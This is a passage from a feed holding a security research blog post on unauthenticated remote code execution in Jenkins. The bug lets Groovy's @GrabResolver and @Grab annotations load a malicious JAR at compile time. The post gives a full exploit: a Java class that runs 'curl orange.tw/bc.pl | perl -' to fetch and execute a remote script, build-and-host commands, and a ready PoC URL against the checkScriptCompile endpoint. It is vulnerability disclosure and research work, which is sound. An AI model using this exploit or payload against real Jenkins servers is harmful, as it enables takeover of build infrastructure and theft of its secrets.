&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;poc.groovy

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;groovy poc.groovy
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;poc.groovy  pwned
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cool, it works! However, while reproducing this on the remote Jenkins, it shows:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;unable to resolve class org.jenkinsci.plugins.workflow.libs.Library&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190219/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What the hell!!! What‚Äôs wrong with that?&lt;/p&gt;

&lt;p&gt;With a little bit digging, we found the root cause. This is caused by the &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt;! In order to reuse functions in Pipeline, Jenkins provides the feature that can import customized library into Pipeline! Jenkins will load this library before every executed Pipeline. As a result, the problem become lack of corresponding library in classPath during compile-time. That‚Äôs why the error &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unsable to resolve class&lt;/code&gt; occurs!&lt;/p&gt;

&lt;p&gt;How to fix this problem? It‚Äôs simple! Just go to &lt;a href=&quot;http://jenkins.local/pluginManager/&quot;&gt;Jenkins Plugin Manager&lt;/a&gt; and remove the &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt;! It can fix the problem and then we can execute arbitrary code without any error! But, this is not a good solution because this plugin is installed along with the Pipeline. It‚Äôs lame to ask administrator to remove the plugin for code execution! We stop digging this and try to find another way!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;second-attempt&quot;&gt;Second Attempt&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;We continued reading the &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Groovy Meta-Programming manual&lt;/a&gt; and found another interesting annotation - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;. There is no detailed information about &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Grab&lt;/code&gt; on the manual. However, we found another article - &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/documentation/grape.html&quot;&gt;Dependency management with Grape&lt;/a&gt; on search engine!&lt;/p&gt;

&lt;p&gt;Oh, from the article we know Grape is a built-in JAR dependency management in Groovy! It can help programmers import the library which are not in classPath. The usage looks like:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;org.springframework&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;spring-orm&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;3.2.5.RELEASE&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.jdbc.core.JdbcTemplate&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Grab&lt;/code&gt; annotation, it can import the JAR file which is not in classPath during compile-time automatically! If you just want to bypass the Pipeline sandbox via a valid credential and the permission of Pipeline execution, that‚Äôs enough. You can follow the &lt;a href=&quot;https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc&quot;&gt;PoC&lt;/a&gt; proveded by &lt;a href=&quot;https://github.com/adamyordan&quot;&gt;@adamyordan&lt;/a&gt; to execute arbitrary commands!&lt;/p&gt;

&lt;p&gt;However, without a valid credential and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute()&lt;/code&gt; method, this is just an AST parser and you even can‚Äôt control files on remote server. So, what can we do? By diving into more about &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;, we found another interesting annotation - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@GrabResolver&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@GrabResolver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;restlet&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;http://maven.restlet.org/&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;org.restlet&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;org.restlet&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;1.1.6&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.restlet&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you are smart enough, you would like to change the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; parameter to a malicious website! Let‚Äôs try this in local environment:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&apos;
@GrabResolver(name=&apos;restlet&apos;, root=&apos;http://orange.tw/&apos;)
@Grab(group=&apos;org.restlet&apos;, module=&apos;org.restlet&apos;, version=&apos;1.1.6&apos;)
import org.restlet
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;pre&gt;&lt;code class=&quot;language-log&quot;&gt;11.22.33.44 - - [18/Dec/2018:18:56:54 +0800] &quot;HEAD /org/restlet/org.restlet/1.1.6/org.restlet-1.1.6-javadoc.jar HTTP/1.1&quot; 404 185 &quot;-&quot; &quot;Apache Ivy/2.4.0&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Wow, it works! Now, we believe we can make Jenkins import any malicious library by Grape! However, the next problem is, how to get code execution?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-way-to-code-execution&quot;&gt;The Way to Code Execution&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;In the exploitation, the target is always escalating the read primitive or write primitive to code execution! From the previous section, we can write malicious JAR file into remote Jenkins server by Grape. However, the next problem is how to execute code?&lt;/p&gt;

&lt;p&gt;By diving into &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/Grape.java&quot;&gt;Grape implementation on Groovy&lt;/a&gt;, we realized the library fetching is done by the class &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/GrapeIvy.groovy&quot;&gt;groovy.grape.GrapeIvy&lt;/a&gt;! We started to find is there any way we can leverage, and we noticed an interesting method &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312&quot;&gt;processOtherServices(‚Ä¶)&lt;/a&gt;!&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processOtherServices&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.runtime.SerializedCategoryMethods&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;processSerializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.plugins.Runners&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZipException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ignore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// ignore files we can&apos;t process, e.g. non-jar/zip artifacts&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// TODO log a warning&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;JAR file is just a subset of ZIP format. In the &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312&quot;&gt;processOtherServices(‚Ä¶)&lt;/a&gt;, Grape registers servies if there are some specified entry points. Among them, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Runner&lt;/code&gt; interests me. By looking into the implementation of &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L335&quot;&gt;processRunners(‚Ä¶)&lt;/a&gt;, we found this:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readLines&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;GroovySystem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;RUNNER_REGISTRY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here we see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newInstance()&lt;/code&gt;. Does it mean that we can call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; on any class? Yes, so, we can just create a malicious JAR file, and put the class name into the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;META-INF/services/org.codehaus.groovy.plugins.Runners&lt;/code&gt; and we can invoke the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; and execute arbitrary code!&lt;/p&gt;

&lt;p&gt;Here is the full exploit:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Orange&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Orange&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;curl orange.tw/bc.pl | perl -&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;javac Orange.java
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; META-INF/services/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Orange &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; META-INF/services/org.codehaus.groovy.plugins.Runners
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
./Orange.java
./Orange.class
./META-INF
./META-INF/services
./META-INF/services/org.codehaus.groovy.plugins.Runners

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;jar cvf poc-1.jar tw/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;poc-1.jar ~/www/tw/orange/poc/1/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; http://[your_host]/tw/orange/poc/1/poc-1.jar
HTTP/1.1 200 OK
Date: Sat, 02 Feb 2019 11:10:55 GMT
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
?value=
@GrabConfig(disableChecksums=true)%0a
@GrabResolver(name=&apos;orange.tw&apos;, root=&apos;http://[your_host]/&apos;)%0a
@Grab(group=&apos;tw.orange&apos;, module=&apos;poc&apos;, version=&apos;1&apos;)%0a
import Orange;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Video:&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/abuH-j-6-s0&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;With the exploit, we can gain full access on remote Jenkins server! We use Meta-Programming to import malicious JAR file during compile-time, and executing arbitrary code by the Runner service! Although there is a built-in Groovy Sandbox(&lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Script+Security+Plugin&quot;&gt;Script Security Plugin&lt;/a&gt;) on Jenkins to protect the Pipeline, it‚Äôs useless because the vulnerability is in compile-time, not in run-time!&lt;/p&gt;

&lt;p&gt;Because this is an attack vector on Groovy core, all methods related to the Groovy parser are affected!  It breaks the developer‚Äôs thought which there is no execution so there is no problem. It is also an attack vector that requires the knowledge about computer science. Otherwise, you cannot think of the Meta-Programming! That‚Äôs what makes this vulnerability interesting. Aside from entry points &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doCheckScriptCompile(...)&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;toJson(...)&lt;/code&gt; I reported, after the vulnerability has been fixed, &lt;a href=&quot;https://twitter.com/0ang3el&quot;&gt;Mikhail Egorov&lt;/a&gt; also found another &lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292&quot;&gt;entry point&lt;/a&gt; quickly to trigger this vulnerability!&lt;/p&gt;

&lt;p&gt;Apart from that, this vulnerability can also be chained with my previous exploit on &lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1&lt;/a&gt; to bypass the Overall/Read restriction to a well-deserved pre-auth remote code execution. If you fully understand the article, you know how to chain :P&lt;/p&gt;

&lt;p&gt;Thank you for reading this article and hope you like it! Here is the end of Hacking Jenkins series, I will publish more interesting researches in the future :)&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/</link>
                <guid>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en</guid>
                <pubDate>Tue, 19 Feb 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Hacking Jenkins Part 1 - Play with Dynamic Routing</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

